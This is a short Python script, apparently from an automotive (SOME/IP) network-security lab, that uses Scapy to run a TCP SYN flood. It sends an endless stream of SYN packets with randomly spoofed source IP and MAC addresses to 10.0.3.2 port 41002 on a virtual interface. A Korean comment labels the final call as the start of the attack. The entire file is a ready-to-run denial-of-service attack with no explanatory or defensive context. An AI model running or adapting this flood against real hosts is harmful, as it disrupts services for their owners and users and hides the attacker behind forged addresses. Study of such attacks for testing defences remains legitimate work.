from scapy.all import *
from scapy.contrib.automotive.someip import *

from common import update_udp_chksum
import pdb
import time
import struct

def random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def random_mac():
    return ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))

def syn_flood(target_ip, target_port):
    src_port = 10000
    dst_port = target_port
    dst_ip = target_ip
    dst_mac = "00:00:00:00:00:02"
    while True:
        src_ip = random_ip()
        src_mac = random_mac()
        eth = Ether(src=src_mac, dst=dst_mac)
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags='S')
        packet = eth/ip/tcp

        sendp(packet, iface='veth0.3')
        #pdb.set_trace()
        time.sleep(0.1)

target_ip = "10.0.3.2"
#target_port = 8000
target_port = 41002

# 공격 시작
syn_flood(target_ip, target_port)
